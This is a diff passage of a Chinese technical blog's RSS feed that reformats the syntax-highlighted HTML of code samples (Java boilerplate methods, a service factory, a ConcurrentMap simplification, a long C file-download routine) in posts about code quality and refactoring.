+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; Future&amp;lt;RemoteExecuteResult&amp;gt; &lt;span style=&#34;color:#008b45&#34;&gt;handleLoad&lt;/span&gt;() &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;throws&lt;/span&gt; SspException {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;try&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            initSshClient();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            Future&amp;lt;RemoteExecuteResult&amp;gt; feture = loadPackage();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;return&lt;/span&gt; feture;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        } &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;catch&lt;/span&gt; (SspException e) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            LOGGER.&lt;span style=&#34;color:#658b00&#34;&gt;error&lt;/span&gt;(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;Load site package failed&amp;#34;&lt;/span&gt;, e);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            closeSshClient();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;throw&lt;/span&gt; e;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#228b22&#34;&gt;// 下面还有几个类似的方法，不再一一列表
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;上面的代码较直观地出现重复（相似），除了执行具体的动作与日志不一样，都是样板代码。当然还存在其它问题:&lt;/p&gt;</description>
     </item>
     
     <item>
@@ -873,26 +888,26 @@ at oracle.&lt;span style=&#34;color:#658b00&#34;&gt;jdbc&lt;/span&gt;.&lt;span s
       <guid>http://lanlingzi.cn/post/technical/2020/0605_code/</guid>
       <description>&lt;h1 id=&#34;案例&#34;&gt;案例&lt;/h1&gt;
 &lt;p&gt;下面的代码来自我们某一平台产品源码(Java语言)中（&lt;code&gt;代码一&lt;/code&gt;）：&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-Java&#34; data-lang=&#34;Java&#34;&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#008b45;font-weight:bold&#34;&gt;ServiceFactory&lt;/span&gt; {
-    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;private&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;static&lt;/span&gt; ServiceFactory instance = &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;new&lt;/span&gt; ServiceFactory();
-
-    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;static&lt;/span&gt; ServiceFactory &lt;span style=&#34;color:#008b45&#34;&gt;getInstance&lt;/span&gt;() {
-        &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;return&lt;/span&gt; instance;
-    }
-
-    &lt;span style=&#34;color:#707a7c&#34;&gt;@Getter&lt;/span&gt; 
-    &lt;span style=&#34;color:#707a7c&#34;&gt;@Setter&lt;/span&gt;
-    &lt;span style=&#34;color:#707a7c&#34;&gt;@Autowired&lt;/span&gt; 
-    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;private&lt;/span&gt; AppTemplateDesignServie appTemplateDesignServie;
-   
-    &lt;span style=&#34;color:#707a7c&#34;&gt;@Getter&lt;/span&gt; 
-    &lt;span style=&#34;color:#707a7c&#34;&gt;@Setter&lt;/span&gt;
-    &lt;span style=&#34;color:#707a7c&#34;&gt;@Autowired&lt;/span&gt; 
-    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;private&lt;/span&gt; AppTemplateExportServie appTemplateExportServie;
-    
-    &lt;span style=&#34;color:#228b22&#34;&gt;// 下面还有十多个Service对象注入，提供Getter与Setter，不再一一列出
-&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;再来看另一平台服务的代码(Java语言)（&lt;code&gt;代码二&lt;/code&gt;）：&lt;/p&gt;</description>
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Java&#34; data-lang=&#34;Java&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#008b45;font-weight:bold&#34;&gt;ServiceFactory&lt;/span&gt; {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;private&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;static&lt;/span&gt; ServiceFactory instance = &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;new&lt;/span&gt; ServiceFactory();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;static&lt;/span&gt; ServiceFactory &lt;span style=&#34;color:#008b45&#34;&gt;getInstance&lt;/span&gt;() {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;return&lt;/span&gt; instance;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#707a7c&#34;&gt;@Getter&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#707a7c&#34;&gt;@Setter&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#707a7c&#34;&gt;@Autowired&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;private&lt;/span&gt; AppTemplateDesignServie appTemplateDesignServie;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;   
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#707a7c&#34;&gt;@Getter&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#707a7c&#34;&gt;@Setter&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#707a7c&#34;&gt;@Autowired&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;private&lt;/span&gt; AppTemplateExportServie appTemplateExportServie;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#228b22&#34;&gt;// 下面还有十多个Service对象注入，提供Getter与Setter，不再一一列出
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;再来看另一平台服务的代码(Java语言)（&lt;code&gt;代码二&lt;/code&gt;）：&lt;/p&gt;</description>
     </item>
     
     <item>
@@ -903,23 +918,23 @@ at oracle.&lt;span style=&#34;color:#658b00&#34;&gt;jdbc&lt;/span&gt;.&lt;span s
       <guid>http://lanlingzi.cn/post/technical/2020/0531_code/</guid>
       <description>&lt;h1 id=&#34;案例&#34;&gt;案例&lt;/h1&gt;
 &lt;p&gt;下面的代码来自我们某一中间件产品源码(Java语言)中（&lt;code&gt;写法一&lt;/code&gt;）：&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;color:#228b22&#34;&gt;// ConcurrentMap&amp;lt;String, AtomicLong&amp;gt; rejectMessageCounts = new ConcurrentHashMap&amp;lt;&amp;gt;();
-&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;private&lt;/span&gt; AtomicLong &lt;span style=&#34;color:#008b45&#34;&gt;getRejectMessageCount&lt;/span&gt;(String serviceName) {
-    AtomicLong rejectMessageCount = rejectMessageCounts.&lt;span style=&#34;color:#658b00&#34;&gt;get&lt;/span&gt;(serviceName);
-    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;null&lt;/span&gt; == rejectMessageCount) {
-        rejectMessageCount = &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;new&lt;/span&gt; AtomicLong();
-        AtomicLong currentValue = rejectMessageCounts.&lt;span style=&#34;color:#658b00&#34;&gt;putIfAbsent&lt;/span&gt;(serviceName, rejectMessageCount);
-        &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;if&lt;/span&gt; ( &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;null&lt;/span&gt; != currentValue) {
-            rejectMessageCount = currentValue;
-        }
-    }
-    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;return&lt;/span&gt; rejectMessageCount;
-}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;上面的代码是线程安全的，但不够简洁，Java 1.8的&lt;code&gt;ConcurrentMap&lt;/code&gt;提供&lt;code&gt;computeIfAbsent()&lt;/code&gt;方法，可以简化为（&lt;code&gt;写法二&lt;/code&gt;）：&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-Java&#34; data-lang=&#34;Java&#34;&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;private&lt;/span&gt; AtomicLong &lt;span style=&#34;color:#008b45&#34;&gt;getRejectMessageCount&lt;/span&gt;(String serviceName) {
-    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;return&lt;/span&gt; rejectMessageCounts.&lt;span style=&#34;color:#658b00&#34;&gt;computeIfAbsent&lt;/span&gt;(serviceName, (key)-&amp;gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;new&lt;/span&gt; AtomicLong());
-}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;// ConcurrentMap&amp;lt;String, AtomicLong&amp;gt; rejectMessageCounts = new ConcurrentHashMap&amp;lt;&amp;gt;();
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;private&lt;/span&gt; AtomicLong &lt;span style=&#34;color:#008b45&#34;&gt;getRejectMessageCount&lt;/span&gt;(String serviceName) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    AtomicLong rejectMessageCount = rejectMessageCounts.&lt;span style=&#34;color:#658b00&#34;&gt;get&lt;/span&gt;(serviceName);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;null&lt;/span&gt; == rejectMessageCount) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        rejectMessageCount = &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;new&lt;/span&gt; AtomicLong();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        AtomicLong currentValue = rejectMessageCounts.&lt;span style=&#34;color:#658b00&#34;&gt;putIfAbsent&lt;/span&gt;(serviceName, rejectMessageCount);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;if&lt;/span&gt; ( &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;null&lt;/span&gt; != currentValue) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            rejectMessageCount = currentValue;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;return&lt;/span&gt; rejectMessageCount;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;上面的代码是线程安全的，但不够简洁，Java 1.8的&lt;code&gt;ConcurrentMap&lt;/code&gt;提供&lt;code&gt;computeIfAbsent()&lt;/code&gt;方法，可以简化为（&lt;code&gt;写法二&lt;/code&gt;）：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Java&#34; data-lang=&#34;Java&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;private&lt;/span&gt; AtomicLong &lt;span style=&#34;color:#008b45&#34;&gt;getRejectMessageCount&lt;/span&gt;(String serviceName) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;return&lt;/span&gt; rejectMessageCounts.&lt;span style=&#34;color:#658b00&#34;&gt;computeIfAbsent&lt;/span&gt;(serviceName, (key)-&amp;gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;new&lt;/span&gt; AtomicLong());
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
     </item>
     
     <item>
@@ -930,111 +945,111 @@ at oracle.&lt;span style=&#34;color:#658b00&#34;&gt;jdbc&lt;/span&gt;.&lt;span s
       <guid>http://lanlingzi.cn/post/technical/2020/0523_code/</guid>
       <description>&lt;h1 id=&#34;案例&#34;&gt;案例&lt;/h1&gt;
 &lt;p&gt;下面的代码来自我们某一老产品源码(C语言)中：&lt;/p&gt;
-&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;VOS_INT &lt;span style=&#34;color:#008b45&#34;&gt;STARTER_Download&lt;/span&gt;(VOD_VOID) {
-    VOS_UINT32 count, sleepTimeLen;
-    VOS_CHAR ascExcuteFile[INSTALL_MAX_DIRNAME_LEN]={ &lt;span style=&#34;color:#b452cd&#34;&gt;0&lt;/span&gt; };
-    VOS_BOOL enIsHaveUpdateOk = VOS_FALSE;
-    VOS_INT siRet;
-
-    BOOTTRACE(TRACE_TIP, &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;Checking and updating files...&amp;#34;&lt;/span&gt;);
-
-    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;if&lt;/span&gt;(LOAD_Init()==VOS_FALSE) {
-        BOOTTRACE(TRACE_ERR, &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;The LOAD Init return error&amp;#34;&lt;/span&gt;);
-        &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;return&lt;/span&gt; VOS_ERR;
-    }
-
-    siRet=LOAD_Begin(LD_STAGE_INSCHK, &amp;amp;g_downloadFileCount, g_pstFileListInfo, LD_ONLINE_UPDATE);
-    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;if&lt;/span&gt;(siRet != VOS_OK) {
-        LOAD_End();
-        BOOTTRACE(TRACE_ERR, &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;The LOAD Begin return error&amp;#34;&lt;/span&gt;);
-        &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;return&lt;/span&gt; VOS_ERR;
-    }
-
-    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;while&lt;/span&gt;(VOS_TRUE) {
-        &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;for&lt;/span&gt;(count=&lt;span style=&#34;color:#b452cd&#34;&gt;0&lt;/span&gt;;count&amp;lt;g_downloadFileCount;count++) {
-            &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;if&lt;/span&gt; (g_pstFileListInfo[count].enLoadCheckResult == LS_SUCESS_UPDATE ) {
-                enIsHaveUpdateOk = VOS_TRUE;
-            }
-        }
-
-        &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;for&lt;/span&gt;(count=&lt;span style=&#34;color:#b452cd&#34;&gt;0&lt;/span&gt;;count&amp;lt;g_downloadFileCount;count++) {
-            &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;if&lt;/span&gt; (g_pstFileListInfo[count].enLoadCheckResult != LS_SUCESS_UPDATE &amp;amp;&amp;amp;
-                (g_pstFileListInfo[count].enLoadCheckResult != LS_NOT_NEED_UPDATE) &amp;amp;&amp;amp;
-                (g_pstFileListInfo[count].enLoadCheckResult != LS_OMU_NORESPONSE) &amp;amp;&amp;amp;
-                (g_pstFileListInfo[count].enLoadCheckResult != LS_OMU_REFUSE)) {
-                BOOTTRACE(TRACE_ERR, &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;update file %s error and result=%d&amp;#34;&lt;/span&gt;,
-                    g_pstFileListInfo[count].acFileName,
-                    g_pstFileListInfo[count].enLoadCheckResult);
-                &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;break&lt;/span&gt;;
-            }
-
-            &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;if&lt;/span&gt; ((g_pstFileListInfo[count].enLoadCheckResult != LS_OMU_NORESPONSE) &amp;amp;&amp;amp;
-                (enIsHaveUpdateOk == VOS_TRUE) ) {
-                BOOTTRACE(TRACE_ERR, &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;Not all files are updated,download these file again&amp;#34;&lt;/span&gt;);
-                &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;break&lt;/span&gt;;    
-            }
-
-            &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;if&lt;/span&gt; ((g_pstFileListInfo[count].enLoadCheckResult != LS_OMU_REFUSE) &amp;amp;&amp;amp;
-                (enIsHaveUpdateOk == VOS_TRUE) ) {
-                BOOTTRACE(TRACE_ERR, &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;Not all files version are consistent with inschk,download these file again&amp;#34;&lt;/span&gt;);
-                &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;break&lt;/span&gt;;    
-            }
-
-            &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;if&lt;/span&gt; ((g_pstFileListInfo[count].enLoadCheckResult != LS_OMU_NORESPONSE) &amp;amp;&amp;amp;
-                (g_pstFileListInfo[count].bLocalCheck = VOS_FALSE) ) {
-                BOOTTRACE(TRACE_ERR, &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;Fail to connect witch OMU server and local file %s is uncertain, I will still download these files&amp;#34;&lt;/span&gt;, g_pstFileListInfo[count].acFileName);
-                &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;break&lt;/span&gt;;    
-            }
-
-            &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;if&lt;/span&gt; ((g_pstFileListInfo[count].enLoadCheckResult != LS_OMU_REFUSE) &amp;amp;&amp;amp;
-                (g_pstFileListInfo[count].bLocalCheck = VOS_FALSE) ) {
-                BOOTTRACE(TRACE_ERR, &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;OMU fesuse to update and %s local check result=%d or some file updated&amp;#34;&lt;/span&gt;, g_pstFileListInfo[count].acFileName, g_pstFileListInfo[count].bLocalCheck);
-                &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;break&lt;/span&gt;;    
-            }
-
-            &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;if&lt;/span&gt; (g_pstFileListInfo[count].ucFileType == PROG_FILE_TYPE ) {
-                siRet = snprintf_s(ascExcuteFile, &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;sizeof&lt;/span&gt;(ascExcuteFile),  &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;sizeof&lt;/span&gt;(ascExcuteFile)-&lt;span style=&#34;color:#b452cd&#34;&gt;1&lt;/span&gt;,
-                         &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;%s/%s&amp;#34;&lt;/span&gt;, g_pstFileListInfo[count].acFileExecuteDir, g_pstFileListInfo[count].acFileName);
-                &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;if&lt;/span&gt; (siRet &amp;lt;= &lt;span style=&#34;color:#b452cd&#34;&gt;0&lt;/span&gt; ) {
-                    BOOTTRACE(TRACE_ERR, &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;[%s:%d] snprintf_s failed,&amp;#34;&lt;/span&gt;, __FUNCTION__, __LINE__);
-                    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;break&lt;/span&gt;;
-                }
-                (&lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;void&lt;/span&gt;)chmod(ascExcuteFile, S_IRUSE | S_IXUSR);
-            }
-        }
-
-        &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;if&lt;/span&gt; (count == g_downloadFileCount) {
-            BOOTTRACE(TRACE_TIP, &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;All %d files checked or updated OK.&amp;#34;&lt;/span&gt;, g_downloadFileCount);
-            &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;for&lt;/span&gt;(count=&lt;span style=&#34;color:#b452cd&#34;&gt;0&lt;/span&gt;;count&amp;lt;g_downloadFileCount;count++) {
-                BOOTTRACE(TRACE_LOD, &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;%d update result is %d and local check result is %d.&amp;#34;&lt;/span&gt;,
-                 g_pstFileListInfo[count].acFileName, g_pstFileListInfo[count].enLoadCheckResult,
-                 g_pstFileListInfo[count].bLocalCheck);
-            }
-            &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;break&lt;/span&gt;;
-        } &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;else&lt;/span&gt; {
-            &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;if&lt;/span&gt; (g_pstFileListInfo[count].enLoadCheckResult == LS_DISK_FULL){
-                sleepTimeLen=INSTALL_DISK_FULL_AGAIN_TIMELEN;
-            } &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;else&lt;/span&gt; {
-                sleepTimeLen=INSTALL_CONNECT_OMU_AGAIN_TIMELEN;
-            }
-
-            BOOTTRACE(TRACE_ERR, &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;Update file error so sleep for %d second and try again&amp;#34;&lt;/span&gt;, sleepTimeLen);
-            SLEEP(sleepTimeLen);
-
-            siRet=LOAD_Begin(LD_STAGE_INSCHK, &amp;amp;g_downloadFileCount, g_pstFileListInfo, LD_ONLINE_UPDATE);
-            &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;if&lt;/span&gt;(siRet != VOS_OK) {
-                LOAD_End();
-                BOOTTRACE(TRACE_ERR, &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;The LOAD Begin return error&amp;#34;&lt;/span&gt;);
-                &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;return&lt;/span&gt; VOS_ERR;
-            }
-        }
-    }
-
-    BOOTTRACE(TRACE_DBG, &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;Exit STARTER_Download&amp;#34;&lt;/span&gt;);
-    LOAD_End();
-    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;return&lt;/span&gt; VOS_OK;
-}
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;上面的代码我已是删除了每个条件判断的注释，但是代码看起还是有点长。如果不仔细读，还真不看出不函数完成的功能。再来看优化重构之后的代码：&lt;/p&gt;</description>
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;VOS_INT &lt;span style=&#34;color:#008b45&#34;&gt;STARTER_Download&lt;/span&gt;(VOD_VOID) {
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    VOS_UINT32 count, sleepTimeLen;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    VOS_CHAR ascExcuteFile[INSTALL_MAX_DIRNAME_LEN]={ &lt;span style=&#34;color:#b452cd&#34;&gt;0&lt;/span&gt; };
